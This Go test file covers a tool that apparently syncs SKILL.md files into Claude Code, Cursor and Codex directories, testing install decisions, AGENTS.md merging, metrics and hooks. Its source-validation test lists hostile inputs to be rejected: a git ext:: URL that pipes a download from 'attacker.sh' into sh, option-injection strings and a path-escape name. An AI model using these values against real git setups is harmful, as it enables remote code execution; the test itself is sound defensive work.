package main

import (
	"fmt"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func writeSkill(t *testing.T, root, name, body string) string {
	t.Helper()
	dir := filepath.Join(root, name)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "SKILL.md"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	return dir
}

// Covers the SPEC §5/§10 decision table: install, up-to-date, managed drift
// overwrite, unmanaged identical adopt, unmanaged different skip.
func TestDirAdapterDecisionTable(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	repo := t.TempDir()
	stateMap := map[string]InstalledSkill{}
	a := adapters["claude-code"].(dirAdapter)

	dir := writeSkill(t, repo, "alpha", "v1")
	sk := Skill{Name: "alpha", Dir: dir, Source: "default"}

	verb, err := a.Install(sk, "", stateMap)
	if err != nil || verb != "installed" {
		t.Fatalf("fresh install: verb=%q err=%v", verb, err)
	}
	if _, err := os.Stat(filepath.Join(claudeGlobalDir(), "alpha", "SKILL.md")); err != nil {
		t.Fatalf("skill not on disk: %v", err)
	}

	verb, err = a.Install(sk, "", stateMap)
	if err != nil || verb != "" {
		t.Fatalf("up-to-date: verb=%q err=%v", verb, err)
	}

	// Managed drift: local edit then upstream change — must overwrite (§5).
	installed := filepath.Join(claudeGlobalDir(), "alpha", "SKILL.md")
	os.WriteFile(installed, []byte("local hack"), 0o644)
	os.WriteFile(filepath.Join(dir, "SKILL.md"), []byte("v2"), 0o644)
	verb, err = a.Install(sk, "", stateMap)
	if err != nil || verb != "updated" {
		t.Fatalf("drift overwrite: verb=%q err=%v", verb, err)
	}
	got, _ := os.ReadFile(installed)
	if string(got) != "v2" {
		t.Fatalf("expected upstream content, got %q", got)
	}

	// Unmanaged identical → adopt (§10).
	betaDir := writeSkill(t, repo, "beta", "same")
	writeSkill(t, claudeGlobalDir(), "beta", "same")
	verb, err = a.Install(Skill{Name: "beta", Dir: betaDir, Source: "default"}, "", stateMap)
	if err != nil || verb != "adopted" {
		t.Fatalf("adopt: verb=%q err=%v", verb, err)
	}

	// Unmanaged different → skip with error, file untouched (§10).
	gammaDir := writeSkill(t, repo, "gamma", "upstream")
	writeSkill(t, claudeGlobalDir(), "gamma", "mine")
	_, err = a.Install(Skill{Name: "gamma", Dir: gammaDir, Source: "default"}, "", stateMap)
	if err == nil {
		t.Fatal("expected skip error for unmanaged differing skill")
	}
	got, _ = os.ReadFile(filepath.Join(claudeGlobalDir(), "gamma", "SKILL.md"))
	if string(got) != "mine" {
		t.Fatalf("unmanaged skill was modified: %q", got)
	}

	// Project scope lands under <root>/.claude/skills.
	proj := t.TempDir()
	verb, err = a.Install(sk, proj, map[string]InstalledSkill{})
	if err != nil || verb != "installed" {
		t.Fatalf("project install: verb=%q err=%v", verb, err)
	}
	if _, err := os.Stat(filepath.Join(proj, ".claude", "skills", "alpha", "SKILL.md")); err != nil {
		t.Fatalf("project skill missing: %v", err)
	}
}

func TestDiscoverSkills(t *testing.T) {
	repo := t.TempDir()
	writeSkill(t, repo, "b-skill", "x")
	writeSkill(t, repo, "a-skill", "x")
	os.MkdirAll(filepath.Join(repo, ".git"), 0o755)
	skills, err := discoverSkills(repo)
	if err != nil {
		t.Fatal(err)
	}
	if len(skills) != 2 || skills[0].Name != "a-skill" || skills[1].Name != "b-skill" {
		t.Fatalf("unexpected: %+v", skills)
	}
}

func TestReadManifest(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, manifestName)
	os.WriteFile(path, []byte("# team skills\nskills:\n  - code-review\n  - deploy\nother: ignored\n"), 0o644)
	names, err := readManifest(path)
	if err != nil {
		t.Fatal(err)
	}
	if len(names) != 2 || names[0] != "code-review" || names[1] != "deploy" {
		t.Fatalf("unexpected: %v", names)
	}
	os.WriteFile(path, []byte("nothing: here\n"), 0o644)
	if _, err := readManifest(path); err == nil {
		t.Fatal("expected error for manifest without skills")
	}
}

func TestFrontmatterParsing(t *testing.T) {
	repo := t.TempDir()
	dir := writeSkill(t, repo, "fm", "---\nname: fm\ndescription: does things\n---\n\nBody here.")
	fm, body, err := readSkillMD(dir)
	if err != nil || fm.Description != "does things" || !strings.Contains(body, "Body here.") {
		t.Fatalf("frontmatter: %+v body=%q err=%v", fm, body, err)
	}
}

// Cursor reads SKILL.md natively from ~/.cursor/skills, so the adapter copies
// rather than converting — and unlike the old rules-file version, global scope
// must actually produce files.
func TestCursorAdapterCopiesBothScopes(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	repo := t.TempDir()
	dir := writeSkill(t, repo, "cs", "---\nname: cs\ndescription: d\n---\nbody")
	sk := Skill{Name: "cs", Dir: dir, Source: "s"}
	a := adapters["cursor"].(dirAdapter)

	if verb, err := a.Install(sk, "", map[string]InstalledSkill{}); err != nil || verb != "installed" {
		t.Fatalf("global install: verb=%q err=%v", verb, err)
	}
	global := filepath.Join(home, ".cursor", "skills", "cs", "SKILL.md")
	if _, err := os.Stat(global); err != nil {
		t.Fatalf("cursor global skill missing: %v", err)
	}

	proj := t.TempDir()
	if verb, err := a.Install(sk, proj, map[string]InstalledSkill{}); err != nil || verb != "installed" {
		t.Fatalf("project install: verb=%q err=%v", verb, err)
	}
	if _, err := os.Stat(filepath.Join(proj, ".cursor", "skills", "cs", "SKILL.md")); err != nil {
		t.Fatalf("cursor project skill missing: %v", err)
	}

	if err := a.Remove("cs", ""); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(global); !os.IsNotExist(err) {
		t.Fatal("cursor global skill not removed")
	}
}

func TestCodexManagedSection(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	repo := t.TempDir()
	dir := writeSkill(t, repo, "cx", "---\nname: cx\ndescription: codex skill\n---\ninstructions v1")
	proj := t.TempDir()
	os.WriteFile(filepath.Join(proj, "AGENTS.md"), []byte("# My project notes\n"), 0o644)

	a := codexAdapter{}
	if _, err := a.Install(Skill{Name: "cx", Dir: dir}, proj, nil); err != nil {
		t.Fatal(err)
	}
	got, _ := os.ReadFile(filepath.Join(proj, "AGENTS.md"))
	if !strings.Contains(string(got), "# My project notes") || !strings.Contains(string(got), "instructions v1") {
		t.Fatalf("user content lost or skill missing:\n%s", got)
	}

	// Update replaces the block, no duplication; user content preserved.
	os.WriteFile(filepath.Join(dir, "SKILL.md"), []byte("---\nname: cx\ndescription: codex skill\n---\ninstructions v2"), 0o644)
	if _, err := a.Install(Skill{Name: "cx", Dir: dir}, proj, nil); err != nil {
		t.Fatal(err)
	}
	got, _ = os.ReadFile(filepath.Join(proj, "AGENTS.md"))
	s := string(got)
	if strings.Contains(s, "instructions v1") || !strings.Contains(s, "instructions v2") {
		t.Fatalf("stale block not replaced:\n%s", s)
	}
	if strings.Count(s, "### cx") != 1 || strings.Count(s, codexStart) != 1 {
		t.Fatalf("duplicated section:\n%s", s)
	}

	// A skill body containing its own h3 must not orphan the remainder: three
	// syncs used to leak a stale copy of everything after the heading.
	os.WriteFile(filepath.Join(dir, "SKILL.md"),
		[]byte("---\nname: cx\ndescription: codex skill\n---\nintro\n\n### Usage\nrun it"), 0o644)
	for i := 0; i < 3; i++ {
		if _, err := a.Install(Skill{Name: "cx", Dir: dir}, proj, nil); err != nil {
			t.Fatal(err)
		}
	}
	got, _ = os.ReadFile(filepath.Join(proj, "AGENTS.md"))
	if n := strings.Count(string(got), "### Usage"); n != 1 {
		t.Fatalf("h3 in body orphaned %d copies:\n%s", n, got)
	}

	// Second skill appends inside the same managed region.
	dir2 := writeSkill(t, repo, "cy", "---\nname: cy\ndescription: second\n---\nsecond body")
	if _, err := a.Install(Skill{Name: "cy", Dir: dir2}, proj, nil); err != nil {
		t.Fatal(err)
	}
	got, _ = os.ReadFile(filepath.Join(proj, "AGENTS.md"))
	if !strings.Contains(string(got), "### cy") || strings.Count(string(got), codexStart) != 1 {
		t.Fatalf("second skill not merged into region:\n%s", got)
	}
}

func TestTrackAndStats(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	cmdTrack([]string{"my-skill"})
	cmdTrack([]string{"my-skill"})
	events := readEvents()
	if len(events) != 2 || events[0].Skill != "my-skill" || events[0].Tool != "claude-code" {
		t.Fatalf("unexpected events: %+v", events)
	}
}

func TestHookIdempotency(t *testing.T) {
	ss, _ := hookEntries()
	if hasSkillsyncHook(nil) {
		t.Fatal("empty list should not match")
	}
	if !hasSkillsyncHook([]any{ss}) {
		t.Fatal("skillsync entry should match")
	}
}

func TestFlushMetrics(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	cmdTrack([]string{"a"})
	var got []usageEvent
	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		json.NewDecoder(r.Body).Decode(&got)
	}))
	defer srv.Close()
	prev := metricsClient
	metricsClient = srv.Client()
	defer func() { metricsClient = prev }()
	flushMetrics(&Config{Metrics: Metrics{Enabled: true, Endpoint: srv.URL}})
	if len(got) != 1 || got[0].Skill != "a" {
		t.Fatalf("sink got %+v", got)
	}
	if _, err := os.Stat(eventsPath()); !os.IsNotExist(err) {
		t.Fatal("queue not cleared after successful flush")
	}
	// Failed flush keeps the queue.
	cmdTrack([]string{"b"})
	flushMetrics(&Config{Metrics: Metrics{Enabled: true, Endpoint: "https://127.0.0.1:1/nope"}})
	if len(readEvents()) != 1 {
		t.Fatal("queue lost on failed flush")
	}
}

func TestValidateSource(t *testing.T) {
	bad := []Source{
		{Name: "ok", URL: "ext::sh -c 'curl attacker.sh|sh'"},          // transport helper = code execution
		{Name: "ok", URL: "--upload-pack=/tmp/x"},                      // option injection
		{Name: "../../.claude/skills/code-review", URL: "https://x/y"}, // path escape
		{Name: ".hidden", URL: "https://x/y"},
		{Name: "ok", URL: "https://x/y", Pin: "--exec=evil"},
		{Name: "ok", URL: "notaurl"},
	}
	for _, src := range bad {
		if err := validateSource(src); err == nil {
			t.Errorf("expected rejection: %+v", src)
		}
	}
	good := []Source{
		{Name: "org", URL: "https://github.com/a/b.git"},
		{Name: "team", URL: "git@github.com:a/b.git", Pin: "v1.2.0"},
		{Name: "local", URL: "file:///tmp/x"},
		{Name: "ssh", URL: "ssh://git@host/a/b.git"},
	}
	for _, src := range good {
		if err := validateSource(src); err != nil {
			t.Errorf("expected accept %+v: %v", src, err)
		}
	}
}

func TestMetricsRequiresHTTPS(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	cmdTrack([]string{"secret-skill"})
	flushMetrics(&Config{Metrics: Metrics{Enabled: true, Endpoint: "http://metrics.internal/skills"}})
	if len(readEvents()) != 1 {
		t.Fatal("events should be kept, not shipped over cleartext http")
	}
}

func TestSubscriptionSemantics(t *testing.T) {
	all := &Config{}
	if !all.subscribed("anything") {
		t.Fatal("unset list means subscribe to everything")
	}
	none := &Config{GlobalSkills: &[]string{}}
	if none.subscribed("anything") {
		t.Fatal("explicitly emptied list must mean none")
	}
	one := &Config{GlobalSkills: &[]string{"code-review"}}
	if !one.subscribed("code-review") || one.subscribed("other") {
		t.Fatal("explicit list must be honored exactly")
	}
}

func TestAdapterRemove(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	repo := t.TempDir()
	proj := t.TempDir()
	dir := writeSkill(t, repo, "gone", "---\nname: gone\ndescription: d\n---\nbody")
	sk := Skill{Name: "gone", Dir: dir, Source: "s"}

	for _, a := range []Adapter{adapters["claude-code"], adapters["cursor"], adapters["codex"]} {
		if _, err := a.Install(sk, proj, map[string]InstalledSkill{}); err != nil {
			t.Fatal(err)
		}
		if err := a.Remove("gone", proj); err != nil && !os.IsNotExist(err) {
			t.Fatal(err)
		}
	}
	if _, err := os.Stat(filepath.Join(proj, ".claude", "skills", "gone")); !os.IsNotExist(err) {
		t.Fatal("claude skill not removed")
	}
	if _, err := os.Stat(filepath.Join(proj, ".cursor", "skills", "gone")); !os.IsNotExist(err) {
		t.Fatal("cursor skill not removed")
	}
	agents, _ := os.ReadFile(filepath.Join(proj, "AGENTS.md"))
	if strings.Contains(string(agents), "### gone") {
		t.Fatalf("codex section not removed:\n%s", agents)
	}
}


func TestHookUninstallPreservesOtherHooks(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	// A user hook that must survive, alongside ours.
	saveJSON(claudeSettingsPath(), map[string]any{
		"model": "opus",
		"hooks": map[string]any{
			"SessionStart": []any{map[string]any{
				"hooks": []any{map[string]any{"type": "command", "command": "echo mine"}},
			}},
		},
	})
	cmdHook("install")
	cmdHook("uninstall")
	settings, ok := readClaudeSettings()
	if !ok {
		t.Fatal("settings file gone")
	}
	if settings["model"] != "opus" {
		t.Fatal("unrelated settings lost")
	}
	b, _ := json.Marshal(settings)
	if strings.Contains(string(b), "skillsync") {
		t.Fatalf("skillsync hooks not removed: %s", b)
	}
	if !strings.Contains(string(b), "echo mine") {
		t.Fatalf("user hook lost: %s", b)
	}
}

func TestLastChangedAndAge(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	home := t.TempDir()
	t.Setenv("HOME", home)
	repo := filepath.Join(reposDir(), "src")
	if err := os.MkdirAll(repo, 0o755); err != nil {
		t.Fatal(err)
	}
	dir := writeSkill(t, repo, "aged", "body")
	for _, args := range [][]string{
		{"init", "-q"},
		{"-c", "user.email=t@t", "-c", "user.name=Ada Lovelace", "add", "-A"},
		{"-c", "user.email=t@t", "-c", "user.name=Ada Lovelace", "commit", "-qm", "add skill"},
	} {
		cmd := exec.Command("git", args...)
		cmd.Dir = repo
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Skipf("git setup failed: %v: %s", err, out)
		}
	}
	when, who := lastChanged(Skill{Name: "aged", Dir: dir, Source: "src"})
	if when.IsZero() {
		t.Fatal("no commit time resolved")
	}
	if who != "Ada Lovelace" {
		t.Fatalf("author = %q", who)
	}
	if got := humanAge(when); got != "0m ago" {
		t.Fatalf("fresh commit rendered as %q", got)
	}
	if humanAge(time.Time{}) != "unknown" {
		t.Fatal("zero time should render as unknown")
	}
	if humanAge(time.Now().Add(-50*time.Hour)) != "2d ago" {
		t.Fatalf("50h rendered as %q", humanAge(time.Now().Add(-50*time.Hour)))
	}
}

func TestHealthProblemDetection(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	now := time.Now().UTC()

	// No background job registered is the loudest problem.
	s := &State{Health: Health{LastSuccess: now}}
	if p := healthProblem(s); !strings.Contains(p, "no background job") {
		t.Fatalf("expected missing-daemon warning, got %q", p)
	}

	// With a job registered, a recent success is healthy...
	os.MkdirAll(filepath.Dir(launchdPlistPath()), 0o755)
	os.WriteFile(launchdPlistPath(), []byte("x"), 0o644)
	if p := healthProblem(&State{Health: Health{LastSuccess: now}}); p != "" {
		t.Fatalf("expected healthy, got %q", p)
	}
	// ...a stale success warns...
	stale := &State{Health: Health{LastSuccess: now.Add(-30 * time.Hour)}}
	if p := healthProblem(stale); !strings.Contains(p, "No successful sync") {
		t.Fatalf("expected staleness warning, got %q", p)
	}
	// ...and a failure after the last success reports the error.
	failing := &State{Health: Health{
		LastSuccess: now.Add(-time.Hour),
		LastAttempt: now,
		LastError:   "git clone: permission denied",
	}}
	if p := healthProblem(failing); !strings.Contains(p, "permission denied") {
		t.Fatalf("expected failure detail, got %q", p)
	}
}

func TestRecordSync(t *testing.T) {
	s := &State{}
	recordSync(s, fmt.Errorf("boom\nsecond line"))
	if s.Health.LastError != "boom second line" || !s.Health.LastSuccess.IsZero() {
		t.Fatalf("failure not recorded: %+v", s.Health)
	}
	recordSync(s, nil)
	if s.Health.LastError != "" || s.Health.LastSuccess.IsZero() {
		t.Fatalf("success did not clear the error: %+v", s.Health)
	}
}

func TestCheckIsSilentWhenHealthy(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	cmdCheck() // not initialized: must not panic or print
}
